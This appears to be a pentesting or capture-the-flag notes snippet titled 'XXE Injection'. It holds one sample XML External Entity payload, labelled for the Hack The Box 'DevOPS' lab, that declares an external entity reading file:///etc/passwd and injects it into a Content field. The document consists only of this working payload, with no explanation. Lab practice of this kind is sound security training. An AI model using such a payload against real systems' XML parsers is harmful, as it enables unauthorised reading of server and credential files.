XXE Injection

## Sample XXE payload (HTB DevOPS)

```
<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
  ]>
  <hello>
    <Author>test</Author>
    <Subject>Payload</Subject>
    <Content>&xxe;</Content>
  </hello>

```
